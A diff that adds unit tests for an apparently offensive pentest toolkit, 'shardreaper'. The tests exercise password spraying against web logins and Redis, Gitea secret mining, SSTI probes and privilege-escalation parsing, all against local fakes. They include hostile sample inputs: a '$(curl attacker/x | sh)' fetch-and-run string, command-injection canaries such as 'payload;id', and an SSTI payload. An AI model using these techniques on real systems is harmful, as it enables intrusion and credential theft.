@@ -985,6 +985,358 @@ def test_recon_smoke():
             f"port {port} not detected: {t0.get('ports')}"
         assert any(u.get("status") == 200 for u in t0.get("urls", [])), \
             "http probe missed the 200"
+        # lesson 16: recon emits ORIGINS, not ip:port pairs
+        assert t0.get("origins") and t0["origins"][0].startswith(
+            f"http://127.0.0.1:{port}"), f"origins missing: {t0.get('origins')}"
+    finally:
+        srv.shutdown()
+        srv.server_close()
+
+
+# ---------------- v1.3 invariants: origin model / spray registry / sink /
+# hypothesis / advisory / gitmine / priv / watchdog ----------------
+def test_http_origin_jars():
+    """P1: one jar per origin, anon/auth never share, --resolve semantics."""
+    import http.server
+    import socketserver
+    import threading
+    from shardreaper.http import OriginTransport
+
+    class H(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            host = self.headers.get("Host", "")
+            cookie = self.headers.get("Cookie", "")
+            self.send_response(200)
+            self.send_header("Set-Cookie", f"jar={host}; Path=/")
+            self.send_header("Content-Length", str(len(cookie)))
+            self.end_headers()
+            self.wfile.write(cookie.encode())
+
+        def log_message(self, *a):
+            pass
+
+    srv = socketserver.TCPServer(("127.0.0.1", 0), H)
+    port = srv.server_address[1]
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    try:
+        t = OriginTransport(timeout=5, resolve={"a.test": "127.0.0.1",
+                                                "b.test": "127.0.0.1"})
+        ua = f"http://a.test:{port}/"
+        ub = f"http://b.test:{port}/"
+        assert t.request("GET", ua, context="anon")["body"] == ""
+        assert "jar=a.test" in t.request("GET", ua, context="anon")["body"]
+        # different origin on the same IP: its own jar — no cookie leak
+        assert t.request("GET", ub, context="anon")["body"] == ""
+        # authenticated context starts empty and never poisons the anon jar
+        assert t.request("GET", ua, context="user:admin")["body"] == ""
+        assert "jar=a.test" in t.request("GET", ua, context="anon")["body"]
+        assert "jar=a.test" in t.request("GET", ua,
+                                         context="user:admin")["body"]
+    finally:
+        srv.shutdown()
+        srv.server_close()
+
+
+def test_http_cookie_domain_pinning():
+    from shardreaper.http import CookieJar
+    j = CookieJar()
+    j.add(["sid=1; Domain=a.test; Path=/"], "sub.a.test", "/")
+    assert "sid=1" in (j.header("sub.a.test", "/", False) or "")
+    assert j.header("other.test", "/", False) is None
+    j2 = CookieJar()
+    j2.add(["x=1; Path=/"], "a.test", "/")   # no Domain -> exact host pin
+    assert "x=1" in (j2.header("a.test", "/", False) or "")
+    assert j2.header("sub.a.test", "/", False) is None
+
+
+def test_spray_redirect_classification():
+    from shardreaper.spray import classify_response
+    c, _ = classify_response(302, "", "http://app/login",
+                             headers={"location": "/login"})
+    assert c == "redirect-login"
+    c, _ = classify_response(302, "", "http://app/login",
+                             headers={"location": "/dashboard"})
+    assert c == "redirect-other"
+
+
+def test_spray_csrf_and_login_form():
+    from shardreaper.spray import extract_csrf, parse_login_form
+    html = ('<form action="/login" method="post">'
+            '<input type="hidden" name="authenticity_token" value="tok123">'
+            '<input name="username"><input type="password" name="password">'
+            '</form>')
+    assert extract_csrf(html) == ("authenticity_token", "tok123")
+    f = parse_login_form(html, "http://app.test/x")
+    assert f["action"] == "http://app.test/login"
+    assert f["user_field"] == "username" and f["pass_field"] == "password"
+
+
+def test_spray_web_login_probe():
+    from shardreaper.spray import web_login_probe, SURFACE_REGISTRY
+
+    class FakeLogin:
+        def __init__(self):
+            self.posts = []
+
+        def request(self, method, url, headers=None, body=None, context=None,
+                    timeout=None):
+            if method == "GET":
+                return {"status": 200, "headers": {},
+                        "body": '<form action="/login">'
+                        '<input name="authenticity_token" value="c1">'
+                        '<input name="username">'
+                        '<input type="password" name="password"></form>'}
+            self.posts.append((url, body or b"", context))
+            # wrong password -> back to login
+            if b"password=bad" in (body or b""):
+                return {"status": 302, "headers": {"location": "/login"},
+                        "body": ""}
+            return {"status": 302, "headers": {"location": "/dashboard"},
+                    "body": ""}
+
+    fake = FakeLogin()
+    surf = {"kind": "web-login", "url": "http://app.test/login",
+            "name": "web-login:http://app.test/login"}
+    hit = web_login_probe(surf, {"type": "password", "value": "good",
+                                 "user": "admin"}, fake)
+    assert hit and hit["class"] == "redirect-other"
+    assert fake.posts[0][2] == "user:admin"   # auth context, not anon
+    assert b"authenticity_token=c1" in fake.posts[0][1]  # CSRF attached
+    assert web_login_probe(surf, {"type": "password", "value": "bad",
+                                  "user": "admin"}, fake) is None
+    # the registry is extensible — a closed list is the bug
+    assert "web-login" in SURFACE_REGISTRY
+
+
+class FakeLoginTransport:
+    def request(self, method, url, headers=None, body=None, context=None,
+                timeout=None):
+        return {"status": 404, "headers": {}, "body": ""}
+
+
+def test_spray_registry_extensible():
+    from shardreaper.spray import spray, register_surface, SURFACE_REGISTRY
+
+    def fake_prober(surface, creds, transport, timeout=6, log=None):
+        return [{"surface": surface["name"], "status": 200,
+                 "credential": "custom:hit", "form": "custom",
+                 "class": "2xx-ok", "hit": True}]
+
+    register_surface("custom-test", fake_prober)
+    assert "custom-test" in SURFACE_REGISTRY
+    d = tempfile.mkdtemp()
+    eng = Engagement(d, "regtest", os.path.join(d, "scope.json"))
+    eng.state["seeds"] = ["10.0.0.9"]
+    r = spray(eng, [{"type": "sa-token", "value": "tokxxxxxxxx"}],
+              log=lambda m: None, ssh=False,
+              probe=lambda s, headers=None, timeout=6: (404, "", "tcp"),
+              transport=FakeLoginTransport(),
+              extra_surfaces=[{"kind": "custom-test", "name": "custom:x"}])
+    assert any(h.get("form") == "custom" for h in r["hits"])
+
+
+def test_spray_redis_auth():
+    from shardreaper.spray import _redis_ping
+    import socket
+    import threading
+
+    def serve(mode):
+        srv = socket.socket()
+        srv.bind(("127.0.0.1", 0))
+        srv.listen(1)
+        port = srv.getsockname()[1]
+
+        def handler():
+            conn, _ = srv.accept()
+            try:
+                for _ in range(3):
+                    line = b""
+                    while not line.endswith(b"\r\n"):
+                        line += conn.recv(1)
+                    parts = line.split(b"\r\n")
+                    n = int(parts[0][1:])
+                    args = []
+                    for _ in range(n):
+                        hdr = b""
+                        while not hdr.endswith(b"\r\n"):
+                            hdr += conn.recv(1)
+                        ln = int(hdr[1:])
+                        data = b""
+                        while len(data) < ln + 2:
+                            data += conn.recv(ln + 2 - len(data))
+                        args.append(data[:ln].decode())
+                    cmd = args[0].upper() if args else ""
+                    if mode == "open":
+                        conn.sendall(b"+PONG\r\n")
+                    elif mode == "auth" and cmd == "PING":
+                        conn.sendall(b"-NOAUTH Authentication required.\r\n")
+                    elif mode == "auth" and cmd == "AUTH":
+                        conn.sendall(b"+OK\r\n" if args[1] == "pw"
+                                     else b"-WRONGPASS\r\n")
+            finally:
+                conn.close()
+                srv.close()
+
+        threading.Thread(target=handler, daemon=True).start()
+        return port
+
+    assert _redis_ping("127.0.0.1", serve("open"), None)[0] is True
+    ok, note = _redis_ping("127.0.0.1", serve("auth"), "pw")
+    assert ok is True
+    assert _redis_ping("127.0.0.1", serve("auth"), "wrong")[0] is False
+
+
+def test_gitmine_detect_and_mine_blob_hashes():
+    import base64
+    from shardreaper.gitmine import mine, secret_scan
+
+    class FakeGit:
+        def __init__(self):
+            self.calls = []
+
+        def request(self, method, url, headers=None, context=None,
+                    timeout=None):
+            self.calls.append(url)
+            path = url.replace("http://git.test", "")
+            base = path.split("?")[0]
+            routes = {
+                "/api/v1/version": {"status": 200,
+                                    "body": '{"version":"1.22"}'},
+                "/api/v1/users/search": {"status": 200,
+                                         "body": '{"data":[{"login":"admin"}]}'},
+                "/api/v1/users/admin/repos": {
+                    "status": 200,
+                    "body": '[{"name":"secretrepo"}]'},
+                "/api/v1/repos/admin/secretrepo/commits": {
+                    "status": 200, "body": "[]"},
+                "/api/v1/repos/admin/secretrepo/git/trees/master": {
+                    "status": 200,
+                    "body": '{"tree":[{"type":"blob","path":".env",'
+                            '"sha":"abc123"}]}'},
+                "/api/v1/repos/admin/secretrepo/git/blobs/abc123": {
+                    "status": 200,
+                    "body": '{"content":"' + base64.b64encode(
+                        b"DB_PASSWORD=hunter2secret").decode() + '"}'},
+            }
+            r = routes.get(base, {"status": 404, "body": ""})
+            return {"status": r["status"], "headers": {},
+                    "body": r["body"], "raw": b""}
+
+    fake = FakeGit()
+    report = mine("http://git.test", fake, deep=False)
+    assert report["platform"] == "gitea"
+    assert "admin" in report["users"]
+    assert "admin/secretrepo" in report["repos"]
+    assert report["blobs_fetched"] == 1
+    assert any(s["kind"] == "password-assign" for s in report["secrets"])
+    # lesson 21: blob content is fetched via the BLOB-HASH endpoint —
+    # never a raw ref endpoint
+    assert any("/git/blobs/abc123" in c for c in fake.calls)
+    assert not any("/raw" in c for c in fake.calls)
+    assert secret_scan("AKIAIOSFODNN7EXAMPLE key")[0]["kind"] == "aws-key"
+
+
+def test_sink_contracts():
+    from shardreaper.sink import (marker_payloads, evaluate_source,
+                                  evaluate_marker, exploit_allowed,
+                                  new_contract, contract_for)
+    payload, expect = marker_payloads("ssti")[0]
+    assert payload == "{{7*7}}" and expect == "49"
+    # a raw string render path DISQUALIFIES even if eval appears elsewhere
+    status, reason, hits = evaluate_source(
+        "ssti", "x = innerHTML; var s = 'raw string'; // eval noted")
+    assert status == "disproven"
+    status, reason, hits = evaluate_source(
+        "ssti", "return render_template('user', name=name)")
+    assert status == "proven"
+    assert evaluate_marker("ssti", "computed: 49")[0] == "proven"
+    assert evaluate_marker("ssti", "no output")[0] == "disproven"
+    d = tempfile.mkdtemp()
+    eng = Engagement(d, "sinktest", os.path.join(d, "scope.json"))
+    ok, why = exploit_allowed(eng, "ssti", "profile")
+    assert not ok and "cheapest oracle" in why      # gate closed
+    new_contract(eng, "ssti", "profile", oracle="source", status="proven",
+                 reason="render_template confirmed")
+    ok, why = exploit_allowed(eng, "ssti", "profile")
+    assert ok
+    assert contract_for(eng, "ssti", "profile")["status"] == "proven"
+
+
+def test_hypothesis_lifecycle_and_tombstones():
+    from shardreaper import hypothesis, memory
+    d = tempfile.mkdtemp()
+    eng = Engagement(d, "hyptest", os.path.join(d, "scope.json"))
+    h = hypothesis.new_hypothesis(eng, "ssti-in-profile", host="app.test",
+                                  budget=2, cutoff=2)
+    hypothesis.note_evidence(eng, h["id"], "marker rendered")
+    hypothesis.probe_failed(eng, h["id"])  # evidence resets the counter
+    assert hypothesis.get(eng, h["id"])["status"] == "running"
+    hypothesis.probe_failed(eng, h["id"])
+    h2 = hypothesis.get(eng, h["id"])
+    assert h2["status"] == "dead" and h2["tombstone"]
+    reason = memory.tombstoned("app.test", "ssti-in-profile")
+    assert reason and "cutoff" in reason        # death recorded with the WHY
+    assert hypothesis.tombstoned("app.test", "ssti-in-profile")
+
+
+def test_priv_parse_and_canaries():
+    from shardreaper.priv import (parse_cron, parse_systemctl, trace_inputs,
+                                  path_canaries)
+    jobs = parse_cron("* * * * * root /opt/backup.sh /tmp/x\n"
+                      "@reboot root /usr/bin/runner\n", "crontab")
+    assert len(jobs) == 2 and jobs[0]["user"] == "root"
+    assert "backup.sh" in jobs[0]["command"]
+    timers = parse_systemctl("logrotate.timer     Tue 2026-01-01 00:00:00 "
+                             "UTC  1h left   n/a")
+    assert timers and timers[0]["timer"] == "logrotate.timer"
+    t = trace_inputs("cp /tmp/up.sh /etc/cron.d/x && bash /tmp/up.sh")
+    assert "/tmp" in t["inputs"]
+    t2 = trace_inputs("$(curl attacker/x | sh)")
+    assert "command-sub" in t2["ops"]
+    cans = path_canaries("payload")
+    assert "../payload" in cans and "/tmp/payload" in cans
+    assert "payload;id" in cans and "payload|id" in cans
+
+
+def test_advisory_lookup_offline_and_boundary():
+    from shardreaper.analysis import advisory_lookup, ADVISORY_HOSTS
+    r = advisory_lookup("krayin", version="2.2.0", offline=True)
+    assert r["offline"] is True and r["product"] == "krayin"
+    assert r["version"] == "2.2.0"
+    # lesson 20 boundary: only vendor/vuln hosts are ever queried
+    assert "api.github.com" in ADVISORY_HOSTS
+    assert all(h.endswith((".gov", ".com", ".io")) for h in ADVISORY_HOSTS)
+
+
+def test_watchdog_revalidate_targets():
+    import http.server
+    import socketserver
+    import threading
+    from shardreaper.transport import revalidate_targets
+
+    class H(http.server.BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.send_header("Content-Length", "0")
+            self.end_headers()
+
+        def log_message(self, *a):
+            pass
+
+    srv = socketserver.TCPServer(("127.0.0.1", 0), H)
+    port = srv.server_address[1]
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    try:
+        d = tempfile.mkdtemp()
+        eng = Engagement(d, "wtest", os.path.join(d, "scope.json"))
+        eng.state["targets"] = [{"host": "127.0.0.1",
+                                 "ports": {port: None, 1: None},
+                                 "urls": [{"url": f"http://127.0.0.1:{port}/"}]}]
+        r = revalidate_targets(eng, timeout=2)
+        rec = r["127.0.0.1"]
+        assert str(port) in rec["ports_up"]
+        assert "1" in rec["ports_down"]
+        assert any(u.get("status") == 200 for u in rec["urls"])
     finally:
         srv.shutdown()
         srv.server_close()
